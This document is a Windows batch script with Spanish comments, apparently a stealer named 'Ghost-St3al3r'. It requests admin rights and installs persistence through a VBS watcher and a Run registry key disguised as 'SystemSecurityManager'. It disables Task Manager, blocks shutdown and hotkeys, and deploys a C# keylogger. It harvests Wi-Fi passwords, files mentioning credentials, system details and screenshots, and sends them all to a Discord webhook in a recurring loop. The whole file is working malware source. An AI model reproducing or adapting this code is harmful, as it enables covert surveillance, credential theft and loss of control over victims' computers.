@echo off
setlocal enabledelayedexpansion
color 0A

>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

(
echo Set WshShell = WScript.CreateObject("WScript.Shell")
echo Do
echo     On Error Resume Next
echo     ' Comprobar si el proceso CMD está ejecutándose
echo     Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
echo     Set colProcessList = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'cmd.exe'")
echo     processFound = False
echo     For Each objProcess in colProcessList
echo         If InStr(objProcess.CommandLine, "PERSISTENT_MARKER") ^> 0 Then
echo             processFound = True
echo             Exit For
echo         End If
echo     Next
echo     
echo     ' Si no se encuentra, reiniciar el proceso
echo     If Not processFound Then
echo         WshShell.Run "cmd.exe /c start /min cmd.exe /c ""cd /d " ^& WScript.Arguments.Item(0) ^& " && " ^& WScript.Arguments.Item(1) ^& """", 0, False
echo     End If
echo     
echo     WScript.Sleep 500
echo Loop
) > "%temp%\watcher.vbs"

copy "%~f0" "%temp%\persistent.bat" /Y >nul

start /min wscript.exe "%temp%\watcher.vbs" "%temp%" "persistent.bat PERSISTENT_MARKER"

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1

(
echo #NoTrayIcon
echo #NoEnv
echo SetWorkingDir %%A_ScriptDir%%
echo #SingleInstance Force
echo 
echo ; Bloquear Alt+F4 y otras combinaciones de teclas
echo !F4::Return
echo !^F4::Return
echo !Tab::Return
echo #F4::Return
echo ^F4::Return
echo 
echo ; Bloquear intentos de apagado
echo OnMessage(0x11, "WM_QUERYENDSESSION")
echo WM_QUERYENDSESSION(wParam, lParam)
echo {
echo     return false
echo }
echo 
echo ; Mantener en ejecución
echo Loop
echo     Sleep, 100
echo Loop
) > "%temp%\blocker.ahk"

powershell -WindowStyle Hidden -Command "if (Test-Path 'C:\Program Files\AutoHotkey\AutoHotkey.exe') { Start-Process 'C:\Program Files\AutoHotkey\AutoHotkey.exe' -ArgumentList '%temp%\blocker.ahk' -WindowStyle Hidden } else { Write-Output '' }" >nul 2>&1

if not exist "C:\Program Files\AutoHotkey\AutoHotkey.exe" (
    powershell -WindowStyle Hidden -Command "$signature = @'
    [DllImport(\"user32.dll\")]
    public static extern bool EnableWindow(IntPtr hWnd, bool bEnable);
    [DllImport(\"user32.dll\")]
    public static extern IntPtr GetConsoleWindow();
    '@;
    Add-Type -MemberDefinition $signature -Name Win32Functions -Namespace Win32;
    while($true) { 
        [Win32.Win32Functions]::EnableWindow([Win32.Win32Functions]::GetConsoleWindow(), $false);
        Start-Sleep -Milliseconds 100
    }" >nul 2>&1
)

powershell -WindowStyle Hidden -Command "$signatureCtrl = @'
[DllImport(\"user32.dll\")]
public static extern IntPtr GetSystemMenu(IntPtr hWnd, bool bRevert);
[DllImport(\"user32.dll\")]
public static extern bool DeleteMenu(IntPtr hMenu, uint uPosition, uint uFlags);
[DllImport(\"user32.dll\")]
public static extern IntPtr GetConsoleWindow();
'@;
Add-Type -MemberDefinition $signatureCtrl -Name Win32FunctionsCtrl -Namespace Win32Ctrl;
$hwnd = [Win32Ctrl.Win32FunctionsCtrl]::GetConsoleWindow();
$menu = [Win32Ctrl.Win32FunctionsCtrl]::GetSystemMenu($hwnd, $false);
[Win32Ctrl.Win32FunctionsCtrl]::DeleteMenu($menu, 0xF060, 0x0);" >nul 2>&1

(
echo using System;
echo using System.Runtime.InteropServices;
echo using System.Diagnostics;
echo using System.Threading;
echo 
echo public class Program {
echo     [DllImport("kernel32.dll")]
echo     static extern IntPtr GetConsoleWindow();
echo 
echo     [DllImport("user32.dll")]
echo     static extern bool EnableWindow(IntPtr hWnd, bool bEnable);
echo 
echo     [DllImport("user32.dll")]
echo     static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
echo 
echo     [DllImport("user32.dll", SetLastError = true)]
echo     static extern int GetWindowLong(IntPtr hWnd, int nIndex);
echo     
echo     [DllImport("user32.dll")]
echo     [return: MarshalAs(UnmanagedType.Bool)]
echo     static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
echo     
echo     private const int SW_HIDE = 0;
echo     private const int GWL_STYLE = -16;
echo     private const int WS_SYSMENU = 0x80000;
echo 
echo     public static void Main() {
echo         IntPtr hwnd = GetConsoleWindow();
echo         
echo         
echo         ShowWindow(hwnd, SW_HIDE);
echo      
echo         int style = GetWindowLong(hwnd, GWL_STYLE);
echo         SetWindowLong(hwnd, GWL_STYLE, (style & ~WS_SYSMENU));
echo         
echo         EnableWindow(hwnd, false);
echo         
echo         while(true) {
echo             Thread.Sleep(100);
echo         }
echo     }
echo }
) > "%temp%\blocker.cs"

powershell -WindowStyle Hidden -Command "if (Test-Path 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe') { Start-Process 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe' -ArgumentList '/nologo /out:\"%temp%\blocker.exe\" \"%temp%\blocker.cs\"' -WindowStyle Hidden; Start-Sleep -Seconds 2; if (Test-Path '%temp%\blocker.exe') { Start-Process '%temp%\blocker.exe' -WindowStyle Hidden } }" >nul 2>&1

(
echo function Set-RegistryStartup {
echo     $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
echo     $name = "SystemSecurityManager"
echo     $value = "cmd.exe /c start /min cmd.exe /c ""wscript.exe %temp%\watcher.vbs %temp% \""persistent.bat PERSISTENT_MARKER\""""" 
echo     
echo     if (!(Test-Path $regPath)) {
echo         New-Item -Path $regPath -Force | Out-Null
echo     }
echo     
echo     Set-ItemProperty -Path $regPath -Name $name -Value $value
echo }
echo 
echo Set-RegistryStartup
) > "%temp%\register.ps1"

powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%temp%\register.ps1" >nul 2>&1

mkdir "%temp%\sysdata" 2>nul
cd "%temp%\sysdata"

set "USERNAME=%USERNAME%"
set "COMPUTERNAME=%COMPUTERNAME%"
set "OS=%OS%"
set "DATE_TIME=%date% %time%"

(
echo function Get-SystemInfo {
echo     $computerInfo = Get-ComputerInfo
echo     $networkInfo = Get-NetIPConfiguration | Select-Object InterfaceAlias, IPv4Address, IPv6Address
echo     $installedSoftware = Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Where-Object {$_.DisplayName -ne $null}
echo     $browsers = @("chrome.exe", "firefox.exe", "msedge.exe", "iexplore.exe", "opera.exe", "brave.exe")
echo     $runningBrowsers = Get-Process | Where-Object {$browsers -contains $_.Name} | Select-Object ProcessName -Unique
echo     $userProfiles = Get-WmiObject -Class Win32_UserProfile | Select-Object LocalPath, LastUseTime, Special, Loaded
echo     $antivirusProducts = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct -ErrorAction SilentlyContinue | Select-Object displayName, pathToSignedProductExe
echo     $firewallStatus = Get-NetFirewallProfile | Select-Object Name, Enabled
echo     $storageDevices = Get-WmiObject -Class Win32_DiskDrive | Select-Object Model, Size, Status, MediaType
echo     $volumes = Get-Volume | Select-Object DriveLetter, FileSystemLabel, DriveType, FileSystem, SizeRemaining, Size
echo     $networkAdapters = Get-NetAdapter | Select-Object Name, InterfaceDescription, Status, MacAddress, LinkSpeed
echo     $users = Get-LocalUser | Select-Object Name, Enabled, LastLogon, PasswordRequired, PasswordLastSet
echo     $scheduledTasks = Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"} | Select-Object TaskName, TaskPath, State, Author
echo     $services = Get-Service | Select-Object Name, DisplayName, Status, StartType
echo     $processes = Get-Process | Select-Object Id, ProcessName, CPU, WorkingSet, Path | Sort-Object CPU -Descending | Select-Object -First 20
echo     $cloudServices = @{
echo         "OneDrive" = Test-Path "$env:USERPROFILE\OneDrive"
echo         "Dropbox" = Test-Path "$env:USERPROFILE\Dropbox"
echo         "GoogleDrive" = Test-Path "$env:USERPROFILE\Google Drive"
echo         "iCloudDrive" = Test-Path "$env:USERPROFILE\iCloudDrive"
echo     }
echo     $credentials = @()
echo     try {
echo         $credFiles = Get-ChildItem -Path "$env:USERPROFILE" -Recurse -Include "*.config", "*.xml", "*.ini", "*.txt" -ErrorAction SilentlyContinue | Where-Object { $_.Length -lt 100KB } | Select-Object -First 50
echo         foreach ($file in $credFiles) {
echo             $content = Get-Content $file.FullName -ErrorAction SilentlyContinue -TotalCount 50
echo             if ($content -match 'password|credential|apikey|api_key|secret|token') {
echo                 $credentials += @{
echo                     "Path" = $file.FullName
echo                     "Matches" = ($content | Select-String -Pattern 'password|credential|apikey|api_key|secret|token').Line
echo                 }
echo             }
echo         }
echo     } catch {}
echo     
echo     $browserData = @{}
echo     $chromePaths = @(
echo         "$env:LOCALAPPDATA\Google\Chrome\User Data\Default",
echo         "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default",
echo         "$env:APPDATA\Opera Software\Opera Stable",
echo         "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
echo     )
echo     
echo     foreach ($path in $chromePaths) {
echo         if (Test-Path $path) {
echo             $browserName = if ($path -match "Chrome") {"Chrome"} elseif ($path -match "Edge") {"Edge"} elseif ($path -match "Opera") {"Opera"} else {"Brave"}
echo             $loginData = Join-Path $path "Login Data"
echo             $cookies = Join-Path $path "Cookies"
echo             $history = Join-Path $path "History"
echo             $browserData[$browserName] = @{
echo                 "HasLoginData" = Test-Path $loginData
echo                 "HasCookies" = Test-Path $cookies
echo                 "HasHistory" = Test-Path $history
echo             }
echo         }
echo     }
echo     
echo     $wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
echo         $profileName = $_ -replace ".*:\s+(.*)", '$1'
echo         $passwordInfo = netsh wlan show profile name="$profileName" key=clear | Select-String "Key Content"
echo         if ($passwordInfo) {
echo             $password = $passwordInfo -replace ".*:\s+(.*)", '$1'
echo             [PSCustomObject]@{
echo                 "SSID" = $profileName
echo                 "Password" = $password
echo             }
echo         }
echo     }
echo     
echo     return @{
echo         "SystemInfo" = $computerInfo
echo         "NetworkInfo" = $networkInfo
echo         "InstalledSoftware" = $installedSoftware
echo         "RunningBrowsers" = $runningBrowsers
echo         "UserProfiles" = $userProfiles
echo         "AntivirusProducts" = $antivirusProducts
echo         "FirewallStatus" = $firewallStatus
echo         "StorageDevices" = $storageDevices
echo         "Volumes" = $volumes
echo         "NetworkAdapters" = $networkAdapters
echo         "LocalUsers" = $users
echo         "ScheduledTasks" = $scheduledTasks
echo         "Services" = $services
echo         "TopProcesses" = $processes
echo         "CloudServices" = $cloudServices
echo         "PotentialCredentials" = $credentials
echo         "BrowserData" = $browserData
echo         "WifiProfiles" = $wifiProfiles
echo     }
echo }
echo 
echo $systemData = Get-SystemInfo
echo $systemDataJson = $systemData | ConvertTo-Json -Depth 5 -Compress
echo $systemDataJson | Out-File -FilePath "$env:TEMP\sysdata\system_info.json"
echo 
echo 
echo Add-Type -AssemblyName System.Windows.Forms,System.Drawing
echo 
echo function Take-Screenshot {
echo     $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
echo     $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
echo     $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
echo     $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)
echo     $timestamp = Get-Date -Format "yyyyMMdd-HHmmss"
echo     $outputPath = "$env:TEMP\sysdata\screenshot-$timestamp.jpg"
echo     $bitmap.Save($outputPath, [System.Drawing.Imaging.ImageFormat]::Jpeg)
echo     $graphics.Dispose()
echo     $bitmap.Dispose()
echo     return $outputPath
echo }
echo 
echo 
echo $screenshotPath = Take-Screenshot
echo 
echo 
echo $keyloggerCode = @"
echo using System;
echo using System.IO;
echo using System.Diagnostics;
echo using System.Runtime.InteropServices;
echo using System.Windows.Forms;
echo using System.Threading;
echo 
echo public class KeyLogger {
echo     private const int WH_KEYBOARD_LL = 13;
echo     private const int WM_KEYDOWN = 0x0100;
echo     private static LowLevelKeyboardProc _proc = HookCallback;
echo     private static IntPtr _hookID = IntPtr.Zero;
echo     private static string logFilePath = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "sysdata", "keylog.txt");
echo     private static DateTime lastWriteTime = DateTime.Now;
echo     private static string buffer = "";
echo 
echo     public static void Main() {
echo         _hookID = SetHook(_proc);
echo         Application.Run();
echo     }
echo 
echo     private static IntPtr SetHook(LowLevelKeyboardProc proc) {
echo         using (Process curProcess = Process.GetCurrentProcess())
echo         using (ProcessModule curModule = curProcess.MainModule) {
echo             return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
echo         }
echo     }
echo 
echo     private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
echo 
echo     private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
echo         if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
echo             int vkCode = Marshal.ReadInt32(lParam);
echo             bool shift = (Control.ModifierKeys & Keys.Shift) != 0;
echo             string key = "";
echo             
echo             
echo             if (vkCode >= 65 && vkCode <= 90) { // A-Z
echo                 key = shift ? ((Keys)vkCode).ToString() : ((Keys)vkCode).ToString().ToLower();
echo             } else if (vkCode >= 48 && vkCode <= 57) { // 0-9
echo                 key = ((Keys)vkCode).ToString().Replace("D", "");
echo             } else if (vkCode >= 96 && vkCode <= 105) { // NumPad 0-9
echo                 key = ((Keys)vkCode).ToString().Replace("NumPad", "");
echo             } else {
echo                 switch (vkCode) {
echo                     case 13: key = "[ENTER]"; break;
echo                     case 32: key = " "; break;
echo                     case 8: key = "[BACK]"; break;
echo                     case 9: key = "[TAB]"; break;
echo                     default: key = "[" + (Keys)vkCode + "]"; break;
echo                 }
echo             }
echo             
echo             
echo             buffer += key;
echo             
echo             
echo             if (buffer.Length > 100 || (DateTime.Now - lastWriteTime).TotalSeconds > 30) {
echo                 WriteToFile();
echo             }
echo         }
echo         return CallNextHookEx(_hookID, nCode, wParam, lParam);
echo     }
echo     
echo     private static void WriteToFile() {
echo         try {
echo             Directory.CreateDirectory(Path.GetDirectoryName(logFilePath));
echo             string content = $"{DateTime.Now} - {buffer}\r\n";
echo             File.AppendAllText(logFilePath, content);
echo             buffer = "";
echo             lastWriteTime = DateTime.Now;
echo         } catch { }
echo     }
echo 
echo    
echo     [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
echo     private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
echo 
echo     [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
echo     [return: MarshalAs(UnmanagedType.Bool)]
echo     private static extern bool UnhookWindowsHookEx(IntPtr hhk);
echo 
echo     [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
echo     private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
echo 
echo     [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
echo     private static extern IntPtr GetModuleHandle(string lpModuleName);
echo     #endregion
echo }
echo "@
echo 
echo $keyloggerCode | Out-File "$env:TEMP\sysdata\keylogger.cs"
echo 
echo 
echo try {
echo     Add-Type -TypeDefinition $keyloggerCode -Language CSharp -ReferencedAssemblies System.Windows.Forms,System.Drawing
echo     $thread = New-Object System.Threading.Thread([System.Threading.ThreadStart]{
echo         [KeyLogger]::Main()
echo     })
echo     $thread.IsBackground = $true
echo     $thread.Start()
echo } catch {
echo    
echo     if (Test-Path "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe") {
echo         Start-Process "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" -ArgumentList "/nologo /out:$env:TEMP\sysdata\keylogger.exe $env:TEMP\sysdata\keylogger.cs /reference:System.Windows.Forms.dll,System.Drawing.dll" -WindowStyle Hidden -Wait
echo         Start-Process "$env:TEMP\sysdata\keylogger.exe" -WindowStyle Hidden
echo     }
echo }
) > "%temp%\sysdata\collector.ps1"

powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%temp%\sysdata\collector.ps1" >nul 2>&1

set "WEBHOOK_URL=Discord webhook here"

:loop

powershell -WindowStyle Hidden -Command "try { $ip = (Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing).Content; Write-Output $ip } catch { Write-Output 'No se pudo obtener' }" > ip_pub.txt 2>nul
set /p IP_PUBLIC=<ip_pub.txt

powershell -WindowStyle Hidden -Command "if ((Get-ChildItem -Path $env:TEMP\sysdata\screenshot-*.jpg | Measure-Object).Count -lt 5) { Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height; $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size); $timestamp = Get-Date -Format 'yyyyMMdd-HHmmss'; $bitmap.Save(\"$env:TEMP\sysdata\screenshot-$timestamp.jpg\", [System.Drawing.Imaging.ImageFormat]::Jpeg); $graphics.Dispose(); $bitmap.Dispose(); }" >nul 2>&1

powershell -WindowStyle Hidden -Command "if (Test-Path \"$env:TEMP\sysdata\system_info.json\") { $size = (Get-Item \"$env:TEMP\sysdata\system_info.json\").Length; if ($size -lt 1024000) { $json = Get-Content \"$env:TEMP\sysdata\system_info.json\" -Raw; $payload = @{content=\"🔍 **DATOS DEL SISTEMA**\"; username=\"Sistema de Monitoreo\"; avatar_url=\"https://media.discordapp.net/attachments/1260633531542012025/1346646778648334419/RedTiger_Logo.png?ex=67c8f20b&is=67c7a08b&hm=c2b33b9f1899685a6b881283ef4e8fef113c21a23604101af1205bdf84011a57&=&format=webp&quality=lossless&width=339&height=480\"} | ConvertTo-Json; Invoke-RestMethod -Uri \"%WEBHOOK_URL%\" -Method Post -ContentType \"application/json\" -Body $payload; $files = Get-ChildItem \"$env:TEMP\sysdata\screenshot-*.jpg\" | Sort-Object LastWriteTime -Descending | Select-Object -First 1; foreach ($file in $files) { curl.exe -F \"file1=@$($file.FullName)\" %WEBHOOK_URL% } } }" >nul 2>&1

powershell -WindowStyle Hidden -Command "if (Test-Path \"$env:TEMP\sysdata\keylog.txt\") { $content = Get-Content \"$env:TEMP\sysdata\keylog.txt\" -Raw; if ($content.Length -gt 0 -and $content.Length -lt 1024000) { $payload = @{content=\"⌨️ **REGISTRO DE TECLAS**\n```\n$content\n```\"; username=\"Sistema de Monitoreo\"; avatar_url=\"https://media.discordapp.net/attachments/1260633531542012025/1346646778648334419/RedTiger_Logo.png?ex=67c8f20b&is=67c7a08b&hm=c2b33b9f1899685a6b881283ef4e8fef113c21a23604101af1205bdf84011a57&=&format=webp&quality=lossless&width=339&height=480\"} | ConvertTo-Json; Invoke-RestMethod -Uri \"%WEBHOOK_URL%\" -Method Post -ContentType \"application/json\" -Body $payload; Clear-Content \"$env:TEMP\sysdata\keylog.txt\" } }" >nul 2>&1

(
echo {
echo   "content": "🚨 **Actived sistem** 🚨\nUser: **%USERNAME%**\nEquipo: **%COMPUTERNAME%**\nIP: **%IP_PUBLIC%**\nActive time: Continuo",
echo   "username": "Ghost-St3al3r",
echo   "avatar_url": "https://imgur.com/"
echo }
) > notification.json

curl -s -X POST -H "Content-Type: application/json" -d @notification.json %WEBHOOK_URL% >nul 2>&1

timeout /t 60 /nobreak >nul
goto loop